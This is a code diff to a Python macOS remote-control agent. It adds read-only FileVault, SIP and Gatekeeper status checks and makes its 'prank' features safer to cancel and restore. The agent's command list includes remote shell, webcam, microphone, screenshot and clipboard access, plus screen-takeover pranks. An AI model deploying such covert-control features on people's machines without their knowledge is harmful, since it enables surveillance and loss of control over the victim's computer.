@@ -29,6 +29,7 @@ import threading
 import time
 import urllib.request
 import webbrowser
+import uuid
 from urllib.parse import urlsplit
 from pathlib import Path
 from logging.handlers import RotatingFileHandler
@@ -113,6 +114,8 @@ def _read_hardware_inventory_snapshot() -> dict:
         "state": "unknown", "manufacturer": None, "model": None, "cpu": None,
         "architecture": None, "memory_gib": None, "graphics": [],
     }
+
+
     sysctl = shutil.which("sysctl")
     if not sysctl:
         return {**unknown, "state": "unsupported"}
@@ -145,6 +148,70 @@ def _read_hardware_inventory_snapshot() -> dict:
     if not any(value is not None for key, value in result.items() if key not in {"state", "graphics"}):
         return unknown
     return result
+
+
+def _read_filevault_status_snapshot() -> dict:
+    """Read only the FileVault On/Off status; never list users or recovery keys."""
+    source = "fdesetup_status"
+    try:
+        result = subprocess.run(
+            ["fdesetup", "status"], capture_output=True, text=True,
+            timeout=8, check=False, shell=False,
+        )
+    except FileNotFoundError:
+        return {"state": "unsupported", "source": source, "data": {"enabled": None}}
+    except (OSError, subprocess.TimeoutExpired):
+        return {"state": "unknown", "source": source, "data": {"enabled": None}}
+    if result.returncode != 0:
+        return {"state": "unknown", "source": source, "data": {"enabled": None}}
+    output = str(result.stdout or "").strip()
+    if re.fullmatch(r"FileVault is On\.?", output, flags=re.IGNORECASE):
+        return {"state": "supported", "source": source, "data": {"enabled": True}}
+    if re.fullmatch(r"FileVault is Off\.?", output, flags=re.IGNORECASE):
+        return {"state": "supported", "source": source, "data": {"enabled": False}}
+    return {"state": "unknown", "source": source, "data": {"enabled": None}}
+
+
+def _read_sip_status_snapshot() -> dict:
+    """Read SIP state from csrutil without changing settings or exposing output."""
+    source = "csrutil_status"
+    try:
+        result = subprocess.run(
+            ["csrutil", "status"], capture_output=True, text=True,
+            timeout=8, check=False, shell=False,
+        )
+    except FileNotFoundError:
+        return {"state": "unsupported", "source": source, "data": {"enabled": None}}
+    except (OSError, subprocess.TimeoutExpired):
+        return {"state": "unknown", "source": source, "data": {"enabled": None}}
+    if result.returncode == 0:
+        output = str(result.stdout or "").strip()
+        if re.fullmatch(r"System Integrity Protection status: enabled\.?", output, flags=re.IGNORECASE):
+            return {"state": "supported", "source": source, "data": {"enabled": True}}
+        if re.fullmatch(r"System Integrity Protection status: disabled\.?", output, flags=re.IGNORECASE):
+            return {"state": "supported", "source": source, "data": {"enabled": False}}
+    return {"state": "unknown", "source": source, "data": {"enabled": None}}
+
+
+def _read_gatekeeper_status_snapshot() -> dict:
+    """Read Gatekeeper assessment policy without changing it or exposing output."""
+    source = "spctl_status"
+    try:
+        result = subprocess.run(
+            ["spctl", "--status"], capture_output=True, text=True,
+            timeout=8, check=False, shell=False,
+        )
+    except FileNotFoundError:
+        return {"state": "unsupported", "source": source, "data": {"enabled": None}}
+    except (OSError, subprocess.TimeoutExpired):
+        return {"state": "unknown", "source": source, "data": {"enabled": None}}
+    if result.returncode == 0:
+        output = str(result.stdout or "").strip().casefold()
+        if output == "assessments enabled":
+            return {"state": "supported", "source": source, "data": {"enabled": True}}
+        if output == "assessments disabled":
+            return {"state": "supported", "source": source, "data": {"enabled": False}}
+    return {"state": "unknown", "source": source, "data": {"enabled": None}}
 
 
 def _read_driver_inventory_snapshot() -> dict:
@@ -730,7 +797,7 @@ def acquire_instance_lock() -> bool:
 
 SUPPORTED_COMMANDS = (
     "open_url", "notify", "sound", "status_request", "screenshot", "media_temp_cleanup", "media_history", "webcam", "camera_series", "media_cancel", "camera_catalog", "camera_quality", "microphone_catalog", "microphone_level", "microphone_balance", "audio_output_catalog", "audio_output_switch", "microphone_test", "microphone_preview",
-    "sysinfo", "sysinfo_interval", "network_traffic_interval", "cpu_history", "memory_history", "memory_pressure_history", "thermal_snapshot", "battery_health", "battery_cycles", "energy_usage", "sleep_wake_history", "startup_duration", "pending_restart", "os_support", "hardware_inventory", "driver_inventory", "installed_app_inventory", "startup_inventory", "service_inventory", "crash_summary", "smart_trend", "volume_topology", "clock_drift", "volume_history", "processes", "battery", "network", "services", "clipboard",
+    "sysinfo", "sysinfo_interval", "network_traffic_interval", "cpu_history", "memory_history", "memory_pressure_history", "thermal_snapshot", "battery_health", "battery_cycles", "energy_usage", "sleep_wake_history", "startup_duration", "pending_restart", "os_support", "filevault_status", "sip_status", "gatekeeper_status", "hardware_inventory", "driver_inventory", "installed_app_inventory", "startup_inventory", "service_inventory", "crash_summary", "smart_trend", "volume_topology", "clock_drift", "volume_history", "processes", "battery", "network", "services", "clipboard",
     "clipboard_set", "kill_process", "disks", "volume_set",
     "mic", "shell", "shell_cancel", "open_app", "capabilities", "permission_settings", "lock", "volume_toggle",
     "display_catalog", "display_resolution", "display_contact_sheet", "display_screenshot", "display_region_screenshot", "window_catalog", "window_screenshot",
@@ -1202,6 +1269,8 @@ class XgentClient:
         )
         self._standby = False
         self._command_context = threading.local()
+        self._active_prank_cancels: dict[str, object] = {}
+        self._active_prank_cancels_lock = threading.Lock()
         self._open_url_operations: dict[str, dict] = {}
         self._open_url_operations_lock = threading.Lock()
         self._handlers = {
@@ -1246,6 +1315,9 @@ class XgentClient:
             "startup_duration": self._do_startup_duration,
             "pending_restart": self._do_pending_restart,
             "os_support": self._do_os_support,
+            "filevault_status": self._do_filevault_status,
+            "sip_status": self._do_sip_status,
+            "gatekeeper_status": self._do_gatekeeper_status,
             "hardware_inventory": self._do_hardware_inventory,
             "driver_inventory": self._do_driver_inventory,
             "installed_app_inventory": self._do_installed_app_inventory,
@@ -2775,6 +2847,60 @@ class XgentClient:
             "state": identity["state"], "source": "macos_platform_version",
             "checked_at": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
             "data": {"family": identity["family"], "release": identity["release"], "edition": None},
+        })
+
+    def _do_filevault_status(self, payload: dict) -> None:
+        request_id = payload.get("id")
+        if not isinstance(request_id, str) or not 1 <= len(request_id) <= 128:
+            request_id = None
+        snapshot = _read_filevault_status_snapshot()
+        enabled = snapshot["data"]["enabled"]
+        if snapshot["state"] == "supported":
+            text = f"🔐 FileVault: {'включён' if enabled else 'выключен'} (M01-F01)."
+        else:
+            text = f"🔐 FileVault: {snapshot['state']} (M01-F01); достоверный статус не получен."
+        self._publish_response("output", {
+            "type": "filevault_status", "schema": "xider.filevault-status.v1",
+            "feature_id": "M01-F01", "device_id": DEVICE_ID, "id": request_id,
+            "state": snapshot["state"], "source": snapshot["source"],
+            "checked_at": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
+            "data": snapshot["data"], "text": text,
+        })
+
+    def _do_sip_status(self, payload: dict) -> None:
+        request_id = payload.get("id")
+        if not isinstance(request_id, str) or not 1 <= len(request_id) <= 128:
+            request_id = None
+        snapshot = _read_sip_status_snapshot()
+        enabled = snapshot["data"]["enabled"]
+        if snapshot["state"] == "supported":
+            text = f"🛡 SIP: {'включена' if enabled else 'выключена'} (M01-F02)."
+        else:
+            text = f"🛡 SIP: {snapshot['state']} (M01-F02); достоверный статус не получен."
+        self._publish_response("output", {
+            "type": "sip_status", "schema": "xider.sip-status.v1",
+            "feature_id": "M01-F02", "device_id": DEVICE_ID, "id": request_id,
+            "state": snapshot["state"], "source": snapshot["source"],
+            "checked_at": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
+            "data": snapshot["data"], "text": text,
+        })
+
+    def _do_gatekeeper_status(self, payload: dict) -> None:
+        request_id = payload.get("id")
+        if not isinstance(request_id, str) or not 1 <= len(request_id) <= 128:
+            request_id = None
+        snapshot = _read_gatekeeper_status_snapshot()
+        enabled = snapshot["data"]["enabled"]
+        if snapshot["state"] == "supported":
+            text = f"🛡 Gatekeeper: {'включён' if enabled else 'выключен'} (M01-F03)."
+        else:
+            text = f"🛡 Gatekeeper: {snapshot['state']} (M01-F03); достоверный статус не получен."
+        self._publish_response("output", {
+            "type": "gatekeeper_status", "schema": "xider.gatekeeper-status.v1",
+            "feature_id": "M01-F03", "device_id": DEVICE_ID, "id": request_id,
+            "state": snapshot["state"], "source": snapshot["source"],
+            "checked_at": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
+            "data": snapshot["data"], "text": text,
         })
 
     def _do_hardware_inventory(self, payload: dict) -> None:
@@ -4763,6 +4889,7 @@ class XgentClient:
         self._publish_response("output", {"type": "prank_bsod", "device_id": DEVICE_ID, "ok": ok, "text": text})
 
     def _do_prank_fake_update(self, payload: dict) -> None:
+        scene_id = uuid.uuid4().hex
         try:
             command = [sys.executable]
             if not getattr(sys, "frozen", False):
@@ -4771,6 +4898,13 @@ class XgentClient:
             child = subprocess.Popen(command, close_fds=True)
             if child.poll() is not None:
                 raise RuntimeError("дочерний процесс сразу завершился")
+            self._register_prank_cancel(scene_id, lambda: self._terminate_owned_child(child))
+            threading.Thread(
+                target=self._forget_prank_child,
+                args=(scene_id, child),
+                name="xgent-fake-update-waiter",
+                daemon=True,
+            ).start()
             text = "⏳ Запускаю локальный полноэкранный демо-экран macOS. Он закроется через 30 секунд; можно закрыть кнопкой."
             ok = True
         except Exception as exc:
@@ -4856,12 +4990,50 @@ end tell'''
         self._publish_response("output", {"type": "prank_invert_screen", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Реальная инверсия экрана не применена: macOS не даёт надёжного безопасного CLI. Показано только шуточное окно."})
 
     def _do_prank_slow_mouse(self, payload: dict) -> None:
-        def _slow():
-            subprocess.run(["defaults", "write", "-g", "com.apple.mouse.scaling", "0.1"], check=False)
-            time.sleep(8)
-            subprocess.run(["defaults", "write", "-g", "com.apple.mouse.scaling", "1.5"], check=False)
-        threading.Thread(target=_slow, daemon=True).start()
-        self._publish_response("output", {"type": "prank_slow_mouse", "device_id": DEVICE_ID, "ok": True, "text": "🐌 Скорость мыши временно снижена на 8 секунд!"})
+        key = "com.apple.mouse.scaling"
+        try:
+            original = subprocess.run(
+                ["defaults", "read", "-g", key], capture_output=True, text=True, check=True,
+            ).stdout.strip()
+            original_value = float(original)
+            if not math.isfinite(original_value):
+                raise ValueError("mouse scaling is not finite")
+            changed = subprocess.run(
+                ["defaults", "write", "-g", key, "0.1"], capture_output=True, text=True, check=False,
+            )
+            if changed.returncode != 0:
+                raise RuntimeError(changed.stderr.strip() or "defaults write failed")
+        except Exception as exc:
+            self._publish_response("output", {"type": "prank_slow_mouse", "device_id": DEVICE_ID, "ok": False,
+                                                "text": f"⚠️ Скорость мыши не менялась: исходное значение не удалось прочитать или применить ({exc})."})
+            return
+
+        scene_id = uuid.uuid4().hex
+        done = threading.Event()
+        restore_lock = threading.Lock()
+
+        def restore() -> None:
+            with restore_lock:
+                if done.is_set():
+                    return
+                done.set()
+                restored = subprocess.run(
+                    ["defaults", "write", "-g", key, str(original_value)],
+                    capture_output=True, text=True, check=False,
+                )
+                if restored.returncode != 0:
+                    log.error("Не удалось восстановить исходную скорость мыши: %s", restored.stderr.strip())
+            self._finish_prank_cancel(scene_id)
+
+        self._register_prank_cancel(scene_id, restore)
+
+        def _slow_timer() -> None:
+            if not done.wait(8):
+                restore()
+
+        threading.Thread(target=_slow_timer, name="xgent-slow-mouse-timer", daemon=True).start()
+        self._publish_response("output", {"type": "prank_slow_mouse", "device_id": DEVICE_ID, "ok": True,
+                                            "text": "🐌 Скорость мыши снижена на 8 секунд; остановка восстановит исходное значение."})
 
     def _do_prank_random_clicks(self, payload: dict) -> None:
         self._publish_response("output", {"type": "prank_random_clicks", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Случайные клики не выполняются: функция не реализована безопасно."})
@@ -4936,7 +5108,7 @@ end tell'''
         except Exception as exc:
             self._publish_response("output", {"type": "prank_change_wallpaper", "device_id": DEVICE_ID, "ok": False, "text": f"⚠️ Обои не изменены: {exc}"})
 
-    def _do_prank_restore_wallpaper(self, payload: dict) -> None:
+    def _restore_saved_prank_wallpaper(self) -> tuple[bool, str]:
         backup = CONFIG_DIR / "wallpaper_backup.json"
         try:
             paths = json.loads(backup.read_text(encoding="utf-8"))
@@ -4948,9 +5120,12 @@ end tell'''
                 if result.returncode != 0:
                     raise RuntimeError(result.stderr.strip() or "osascript failed")
             backup.unlink(missing_ok=True)
-            text, ok = "✅ Исходные обои восстановлены.", True
+            return True, "✅ Исходные обои восстановлены."
         except Exception as exc:
-            text, ok = f"⚠️ Не удалось восстановить обои: {exc}", False
+            return False, f"⚠️ Не удалось восстановить обои: {exc}"
+
+    def _do_prank_restore_wallpaper(self, payload: dict) -> None:
+        ok, text = self._restore_saved_prank_wallpaper()
         self._publish_response("output", {"type": "prank_restore_wallpaper", "device_id": DEVICE_ID, "ok": ok, "text": text})
 
     def _do_prank_speak_time(self, payload: dict) -> None:
@@ -5085,27 +5260,68 @@ end tell'''
         subprocess.Popen(["say", "-v", "Milena", "Ха ха ха ха! Мва ха ха ха! Я управляю этим компьютером!"])
         self._publish_response("output", {"type": "prank_laugh_track", "device_id": DEVICE_ID, "ok": True, "text": "😈 Зловещий смех запущен на Mac!"})
 
+    def _prank_cancel_registry(self):
+        lock = getattr(self, "_active_prank_cancels_lock", None)
+        if lock is None:
+            lock = threading.Lock()
+            self._active_prank_cancels_lock = lock
+            self._active_prank_cancels = {}
+        return lock, self._active_prank_cancels
+
+    def _register_prank_cancel(self, scene_id: str, callback) -> None:
+        if not isinstance(scene_id, str) or not scene_id or not callable(callback):
+            raise ValueError("prank cancellation registration is invalid")
+        lock, registry = self._prank_cancel_registry()
+        with lock:
+            registry[scene_id] = callback
+
+    def _finish_prank_cancel(self, scene_id: str) -> None:
+        lock, registry = self._prank_cancel_registry()
+        with lock:
+            registry.pop(scene_id, None)
+
+    @staticmethod
+    def _terminate_owned_child(child) -> None:
+        if child.poll() is None:
+            child.terminate()
+
+    def _forget_prank_child(self, scene_id: str, child) -> None:
+        try:
+            child.wait()
+        except Exception:
+            log.exception("Не удалось дождаться XIDER prank child %s", scene_id)
+        finally:
+            self._finish_prank_cancel(scene_id)
+
+    def _cancel_active_pranks(self) -> list[str]:
+        lock, registry = self._prank_cancel_registry()
+        with lock:
+            entries = list(registry.items())
+            registry.clear()
+        cancelled = []
+        for scene_id, callback in entries:
+            try:
+                callback()
+                cancelled.append(scene_id)
+            except Exception:
+                log.exception("Не удалось отменить сценку XIDER %s", scene_id)
+        return cancelled
+
     def _do_prank_stop_all(self, payload: dict) -> None:
-        """Экстренная остановка всех активных приколов на macOS."""
-        log.info("Экстренная остановка всех приколов на Mac (prank_stop_all)...")
-        results = []
-        try:
-            subprocess.run(["pkill", "-f", "afplay"], check=False)
-            subprocess.run(["pkill", "-f", "say"], check=False)
-            results.append("звуки и речь")
-        except Exception:
-            pass
-        try:
-            self._do_prank_restore_wallpaper({})
-            results.append("обои")
-        except Exception:
-            pass
-        restored_str = ", ".join(results) if results else "эффекты сброшены"
+        """Cancel only XIDER-owned scenes and restore persisted prank state."""
+        log.info("Остановка активных приколов XIDER на Mac (prank_stop_all)...")
+        cancelled = self._cancel_active_pranks()
+        _wallpaper_ok, wallpaper_text = self._restore_saved_prank_wallpaper()
         self._publish_response("output", {
             "type": "prank_stop_all",
             "device_id": DEVICE_ID,
-            "ok": True,
-            "text": f"🛑 Все приколы на Mac принудительно остановлены!\nСброшено: {restored_str}",
+            "ok": False,
+            "state": "partial",
+            "text": (
+                f"🛑 Отправлена отмена для сценок XIDER: {len(cancelled)}. {wallpaper_text} "
+                "Итог частичный: старые короткие эффекты завершаются по таймеру. "
+                "Сторонние процессы не трогал."
+            ),
         })
 
     def _do_agent_update(self, payload: dict) -> None:
